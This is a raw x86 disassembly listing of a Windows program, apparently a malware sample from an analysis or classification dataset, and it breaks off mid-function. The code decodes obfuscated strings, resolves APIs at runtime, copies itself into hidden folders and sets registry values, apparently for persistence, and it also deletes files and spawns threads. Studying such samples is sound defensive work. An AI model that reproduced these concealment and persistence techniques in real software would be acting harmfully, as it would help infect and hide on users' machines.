sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_410520
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4010c0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push sub_4079b0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x4 ] 0x0
call sub_401310
test eax eax
jne r-xdata
call sub_403550
call [ Ordinal_WSOCK32_116@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_401090
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
xor dl 0x11
sub dl 0x25
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_4010c0
push esi
push edi
push 0x6
push rw-data
call sub_401090
push 0x8
push rw-data
call sub_401090
push 0x20
push rw-data
call sub_401090
push 0x24
push rw-data
call sub_401090
push 0x3f
push rw-data
call sub_401090
push 0xb
push rw-data
call sub_401090
push 0xd
push rw-data
call sub_401090
push 0x11
push rw-data
call sub_401090
add esp 0x40
push 0x10
push rw-data
call sub_401090
push 0xc
push rw-data
call sub_401090
push 0x16
push rw-data
call sub_401090
push 0xb
push rw-data
call sub_401090
push 0x8
push rw-data
call sub_401090
push 0x8
push rw-data
call sub_401090
push 0x8
push rw-data
call sub_401090
push 0xa
push rw-data
call sub_401090
add esp 0x40
push 0xd
push rw-data
call sub_401090
push 0x8
push rw-data
call sub_401090
push 0xf
push rw-data
call sub_401090
push 0xe
push rw-data
call sub_401090
push 0xe
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x40
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401090
push 0x16
push rw-data
call sub_401090
push 0xb
push rw-data
call sub_401090
push 0xb
push rw-data
call sub_401090
push 0xc
push rw-data
call sub_401090
push 0x9
push rw-data
call sub_401090
add esp 0x40
push 0x13
push rw-data
call sub_401090
push 0xd
push rw-data
call sub_401090
push 0x12
push rw-data
call sub_401090
push 0xa
push rw-data
call sub_401090
add esp 0x20
mov esi rw-data
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_401090
add esi 0x10
add esp 0x8
cmp esi rw-data
jl r-xdata
pop edi
pop esi
retn
sub_401310
push ecx
push ebx
push ebp
mov ebp [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
call ebp
mov ebx [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
mov edi [ FreeLibrary@IAT ]
push esi
mov [ rw-data ] eax
call edi
push rw-data
call ebp
mov esi eax
push rw-data
push esi
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push esi
mov [ rw-data ] eax
call edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ebp
mov esi eax
test esi esi
jne r-xdata
push rw-data
push esi
call ebx
push esi
mov edi eax
call [ FreeLibrary@IAT ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push rw-data
push 0x0
push 0x0
push 0x0
call edi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call edi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
call sub_401a60
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push rw-data
call sub_4029a0
call sub_402a10
neg eax
sbb eax eax
push 0x0
neg eax
mov [ rw-data ] eax
call sub_401a80
add esp 0x8
call sub_401dc0
call sub_402090
call sub_402280
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
call sub_403b60
call sub_407950
call sub_403400
call sub_403500
call sub_403520
call sub_401940
push 0x2000
call sub_408e82
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x2000
call sub_408e82
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x0
push sub_404100
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401940
sub esp 0x200
lea eax [ esp + 0x100 ]
push ebx
push ebp
push esi
push edi
push 0x100
push eax
push 0x0
call [ rw-data ]
lea ecx [ esp + 0x10 ]
push 0x100
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ GetFileAttributesA@IAT ]
mov ebx [ SetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0x10 ]
push eax
push edx
call ebx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x114 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
lea ecx [ esp + 0x10 ]
push 0x0
lea edx [ esp + 0x114 ]
push ecx
push edx
call [ CopyFileA@IAT ]
lea eax [ esp + 0x110 ]
push eax
call sub_406300
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
sub_401a30
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_401a80
sub esp 0x288
push ebp
push esi
xor esi esi
lea eax [ esp + 0x8 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x30 ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x8 ]
mov ebp [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call ebp
test eax eax
jne r-xdata
push edi
lea ecx [ esp + 0x94 ]
push 0x200
push ecx
push 0x0
call [ rw-data ]
lea edx [ esp + 0x94 ]
push 0x5c
push edx
call sub_409000
mov edx eax
add esp 0x8
inc edx
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ edx ]
xor edi edi
test cl cl
je r-xdata
mov al [ esp + 0x10 ]
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push 0x1
push 0x0
push rw-data
push eax
mov [ esp + edi + 0x2c ] 0x0
call [ RegSetValueExA@IAT ]
pop edi
lea esi [ esp + 0x14 ]
mov eax edx
sub esi edx
mov eax [ esp + 0x294 ]
mov [ esi + rw-data ] 0x0
test eax eax
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0x11 ]
inc esi
test al al
jne r-xdata
mov eax [ esp ]
test eax eax
je r-xdata
push 0x0
call sub_408f1e
push eax
call sub_408ef6
add esp 0x8
call sub_408f00
push 0x4
push rw-data
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
push 0x4
push 0x0
push rw-data
push eax
call [ RegSetValueExA@IAT ]
inc cl
inc edi
mov [ esi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push 0x0
push 0x0
push rw-data
push edx
call ebp
pop esi
pop ebp
test eax eax
je r-xdata
add esp 0x288
retn
push eax
call [ RegCloseKey@IAT ]
sub_401c00
sub esp 0x204
lea eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
push 0x200
push eax
call [ rw-data ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x17 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x14 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi [ RegCreateKeyExA@IAT ]
push eax
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
call esi
mov ebx [ esp + 0x21c ]
cmp ebx 0x1
jne r-xdata
mov ebp [ esp + 0x218 ]
mov eax [ esp + 0x10 ]
push ebp
push eax
call [ RegDeleteValueA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x218 ]
[ edi ]
not ecx
mov edx [ esp + 0x10 ]
dec ecx
push ecx
lea ecx [ esp + 0x18 ]
push ecx
push ebx
push ebp
push eax
push edx
call [ SHSetValueA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000001
call esi
cmp ebx 0x1
jne r-xdata
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
call [ RegDeleteValueA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push ebx
push ebp
push eax
mov eax [ esp + 0x24 ]
push eax
call [ SHSetValueA@IAT ]
jmp r-xdata
add esp 0x204
retn
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
je r-xdata
sub_401dc0
sub esp 0x510
push rw-data
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
push ebx
push esi
push edi
lea edx [ esp + 0x31c ]
push 0x200
push edx
push 0x0
call [ rw-data ]
push 0x1
lea eax [ esp + 0x20 ]
push 0x26
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_401a30
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x2e
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_409000
lea ecx [ esp + 0x328 ]
push 0x2e
push ecx
mov [ eax ] 0x0
call sub_409000
add esp 0x14
mov [ eax ] 0x0
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x31c ]
push edx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push 0x1
push rw-data
call sub_401c00
push 0x1
call sub_401a80
add esp 0xc
pop edi
pop esi
pop ebx
add esp 0x510
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x31c ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ SetFileAttributesA@IAT ]
push eax
and ecx 0x3
lea eax [ esp + 0x24 ]
[ edi ] [ esi ]
push eax
call ebx
movsx ecx [ esp + 0x320 ]
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_409157
mov esi [ CopyFileA@IAT ]
add esp 0xc
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x320 ]
push 0x0
push eax
push ecx
call esi
lea edx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x14 ]
push edx
push eax
call esi
mov ebp [ DeleteFileA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call ebp
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x220 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x220 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
lea eax [ esp + 0x224 ]
[ edi ] [ esi ]
push eax
call ebx
lea ecx [ esp + 0x220 ]
push ecx
call ebp
lea edx [ esp + 0x220 ]
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_409129
lea ecx [ esp + 0x28 ]
push ecx
call sub_406f20
add esp 0xc
push 0x1
call sub_409054
pop ebp
sub_402060
push edi
mov edi [ esp + 0xc ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
mov al [ ecx + esi ]
sub al cl
xor al 0x7
mov dl al
shr dl 0x5
shl al 0x3
or dl al
mov [ ecx + esi ] dl
inc ecx
cmp ecx edi
jl r-xdata
pop esi
sub_402090
sub esp 0x30
push esi
push edi
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x1c ]
mov edx [ rw-data ]
[ edi ] [ esi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x14 ] edx
mov [ esp + 0xc ] eax
mov ax [ rw-data ]
mov [ esp + 0x10 ] ecx
mov cl [ rw-data ]
lea edx [ esp + 0x1c ]
push 0x19
push edx
movsw [ edi ] [ esi ]
mov [ esp + 0x20 ] ax
mov [ esp + 0x22 ] cl
call sub_402060
lea eax [ esp + 0x14 ]
push 0xe
push eax
call sub_402060
push 0x3e800
call sub_408e82
mov esi eax
add esp 0x14
test esi esi
je r-xdata
pop edi
pop esi
add esp 0x30
retn
lea ecx [ esp + 0x8 ]
push 0x0
push ecx
push esi
push 0x0
lea edx [ esp + 0x1c ]
push rw-data
push edx
lea eax [ esp + 0x34 ]
push 0x50
push eax
call sub_402b30
add esp 0x20
test eax eax
je r-xdata
push esi
call sub_4091a9
add esp 0x4
mov ecx [ esp + 0x8 ]
push 0x20
push esi
push rw-data
mov [ ecx + esi ] 0x0
call sub_4091e0
add esp 0xc
sub_402160
sub esp 0x404
push ebx
push ebp
push esi
mov esi [ esp + 0x414 ]
push edi
push 0xd
push esi
call sub_4092f0
add esp 0x8
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
sub eax esi
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x14 ]
mov edx ecx
lea ebp [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
dec ebp
[ edi ] [ esi ]
mov [ esp + eax + 0x14 ] 0x3b
mov [ esp + eax + 0x15 ] 0x0
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + ecx + 0x14 ]
cmp ebp eax
mov [ esp + 0x10 ] eax
jae r-xdata
mov eax 0x3fe
cmp eax 0x400
jb r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x404
retn
mov ebx [ esp + 0x41c ]
mov eax [ esp + 0x420 ]
mov [ ebp ] 0x0
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi ebx
mov eax esi
cmp ebp [ esp + 0x10 ]
jb r-xdata
mov edi ebx
xor eax eax
[ esi ] [ edi ]
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea esi [ ebp + 0x1 ]
push 0x3b
push esi
call sub_4092f0
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x404
retn
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
sub_402280
sub esp 0x2c4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0xbc ] eax
mov eax [ rw-data ]
mov [ esp + 0xc0 ] ecx
mov cx [ rw-data ]
mov [ esp + 0xc4 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc8 ] eax
mov eax [ rw-data ]
mov [ esp + 0xcc ] cx
mov ecx [ rw-data ]
mov [ esp + 0xac ] edx
mov dx [ rw-data ]
mov [ esp + 0xb0 ] eax
mov eax [ rw-data ]
mov [ esp + 0xb4 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xb8 ] dx
mov edx [ rw-data ]
mov [ esp + 0x8c ] eax
mov ax [ rw-data ]
mov [ esp + 0x90 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x94 ] edx
mov edx [ rw-data ]
mov [ esp + 0x98 ] ax
mov eax [ rw-data ]
mov [ esp + 0x9a ] cl
mov ecx [ rw-data ]
mov [ esp + 0x3c ] edx
mov dx [ rw-data ]
mov [ esp + 0x40 ] eax
mov al [ rw-data ]
mov [ esp + 0x44 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x48 ] dx
mov edx [ rw-data ]
mov [ esp + 0x4a ] al
mov ax [ rw-data ]
mov [ esp + 0x7c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x80 ] edx
mov edx [ rw-data ]
mov [ esp + 0x84 ] ax
mov al [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x14 ] edx
mov edx [ rw-data ]
mov [ esp + 0x18 ] al
mov eax [ rw-data ]
mov [ esp + 0x4c ] ecx
mov cx [ rw-data ]
mov [ esp + 0x50 ] edx
mov dl [ rw-data ]
mov [ esp + 0x54 ] eax
mov eax [ rw-data ]
mov [ esp + 0x58 ] cx
mov ecx [ rw-data ]
mov [ esp + 0x5a ] dl
mov dl [ rw-data ]
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
mov [ esp + 0x20 ] ecx
